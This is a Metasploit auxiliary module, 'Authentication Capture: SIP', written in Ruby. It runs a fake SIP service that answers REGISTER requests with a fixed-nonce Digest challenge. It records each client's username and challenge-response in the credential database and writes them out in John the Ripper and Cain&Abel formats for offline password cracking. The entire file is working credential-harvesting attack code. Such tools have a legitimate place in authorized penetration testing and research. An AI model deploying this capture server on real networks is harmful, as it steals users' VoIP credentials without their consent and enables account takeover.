##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
require 'rex/socket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: SIP',
      'Description' => %q{
        This module provides a fake SIP service that is designed to
        capture authentication credentials. It captures	challenge and
        response pairs that can be supplied to Cain or JtR for cracking.
      },
      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run SIP capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 5060 ]),
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptString.new('NONCE', [ true, 'The server byte nonce', '1234' ]),
        OptString.new('JOHNPWFILE', [ false, 'The prefix to the local filename to store the hashes in JOHN format', nil ]),
        OptString.new('CAINPWFILE', [ false, 'The local filename to store the hashes in Cain&Abel format', nil ]),
      ]
    )
    register_advanced_options(
      [
        OptString.new('SRVVERSION', [ true, 'The server version to report in the greeting response', 'ser (3.3.0-pre1 (i386/linux))' ]),
        OptString.new('REALM', [false, 'The SIP realm to which clients authenticate', nil ]),
      ]
    )
  end

  def sip_parse_authorization(data)
    kvps = {}
    kvps['scheme'] = data.slice!(0, data.index(' '))
    data.split(/,\s?/).each do |item|
      tokens = item.scan(/^\s?([^=]*)="?(.*?)"?$/)[0]
      kvps[tokens[0]] = tokens[1]
    end
    kvps
  end

  def sip_parse_request(data)
    response = {
      headers_raw: [],
      headers: {},
      uri: nil,
      method: nil,
      protocol: nil
    }
    status = data.slice!(0, data.index(/\r?\n/) + 1).split(/\s/)
    response[:method] = status[0]
    response[:uri] = status[1]
    response[:protocol] = status[2]

    while data.index(/\r?\n/)
      header = data.slice!(0, data.index(/\r?\n/) + 1).chomp
      response[:headers_raw] << header
      key, val = header.split(/:\s*/, 2)
      response[:headers][key] = val
    end
    response
  end

  def sip_send_error_message(request, code, msg)
    ip = @requestor[:ip]
    port = @requestor[:port]
    tag = (0...8).map { rand(65..89).chr }.join
    nonce = datastore['NONCE']
    realm = datastore['REALM'] || sip_sanitize_address(ip)
    auth = []

    auth << "SIP/2.0 #{code} #{msg}"
    auth << "Via: #{request[:headers]['Via']};received=#{ip}".gsub('rport', "rport=#{port}")
    auth << "From: #{request[:headers]['From']}"
    auth << "To: #{request[:headers]['To']};tag=#{tag}"
    auth << "Call-ID: #{request[:headers]['Call-ID']}"
    auth << "CSeq: #{request[:headers]['CSeq']}"
    auth << 'Expires: 600'
    auth << 'Min-Expires: 240'
    auth << "WWW-Authenticate: Digest realm=\"#{realm}\", nonce=\"#{nonce}\""
    auth << "Server: #{datastore['SRVVERSION']}"
    auth << 'Content-Length: 0'
    auth << ''

    @sock.sendto(auth.join("\r\n") << "\r\n", @requestor[:ip].to_s, @requestor[:port])
  end

  # removes any leading ipv6 stuff, such as ::ffff: as it breaks JtR
  def sip_sanitize_address(addr)
    if (addr =~ /:/)
      return addr.scan(/.*:(.*)/)[0][0]
    end

    return addr
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    @port = datastore['SRVPORT'].to_i
    @sock = Rex::Socket::Udp.create(
      'LocalHost' => datastore['SRVHOST'],
      'LocalPort' => @port,
      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
    )
    @run = true
    server_ip = sip_sanitize_address(datastore['SRVHOST'])

    while @run
      res = @sock.recvfrom
      @requestor = {
        ip: res[1],
        port: res[2]
      }
      client_ip = sip_sanitize_address(res[1])
      next if !res[0] || res[0].empty?

      request = sip_parse_request(res[0])
      method = request[:method]

      case method
      when 'REGISTER'
        authorization = request[:headers]['Authorization'] || request[:headers]['Proxy-Authorization']
        if authorization
          if (request[:uri] =~ /^sip:.*?:\d+/)
            # current versions of the JtR plugin will fail cracking SIP uri:s containing a port; eg. sip:1.2.3.4:5060
            print_status('URI with port detected in authorization SIP request, JtR may fail to crack the response')
          end

          auth_tokens = sip_parse_authorization(authorization)
          response = auth_tokens['response'] || ''
          algorithm = auth_tokens['algorithm'] || 'MD5'
          username = auth_tokens['username']
          proof = "client: #{client_ip}; username: #{username}; nonce: #{datastore['NONCE']}; response: #{response}; algorithm: #{algorithm}"
          print_good("SIP LOGIN: #{proof}")

          report_cred(
            ip: @requestor[:ip],
            port: @requestor[:port],
            service_name: 'sip_client',
            user: username,
            password: response + ':' + auth_tokens['nonce'] + ':' + algorithm,
            proof: proof
          )

          if datastore['JOHNPWFILE']
            resp = []
            resp << '$sip$'
            resp << server_ip
            resp << client_ip
            resp << username
            resp << auth_tokens['realm']
            resp << method
            resp << 'sip'
            resp << request[:uri].scan(/^.*?:(.*)$/)
            resp << auth_tokens['nonce']
            resp << (auth_tokens['cnonce'] || '')
            resp << (auth_tokens['nc'] || '')
            resp << (auth_tokens['qop'] || '')
            resp << algorithm
            resp << response

            fd = File.open(datastore['JOHNPWFILE'] + '_sip', 'ab')
            fd.puts(username + ':' + resp.join('*'))
            fd.close
          end

          if datastore['CAINPWFILE']
            resp = []
            resp << auth_tokens['realm']
            resp << auth_tokens['username']
            resp << ''
            resp << request[:uri]
            resp << auth_tokens['nonce']
            resp << response
            resp << method
            resp << algorithm

            fd = File.open(datastore['CAINPWFILE'], 'ab')
            fd.puts resp.join("\t") + "\r\n"
            fd.close
          end

        end
        sip_send_error_message(request, 401, 'Unauthorized')
      when 'ACK'
        # do nothing
      else
        print_error("Unhandled method: #{request[:method]}")
        sip_send_error_message(request, 401, 'Unauthorized')
      end
    end
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
    nil
  rescue StandardError => e
    print_error("Unknown error: #{e.class} #{e.backtrace}")
  ensure
    @sock.close
  end
end
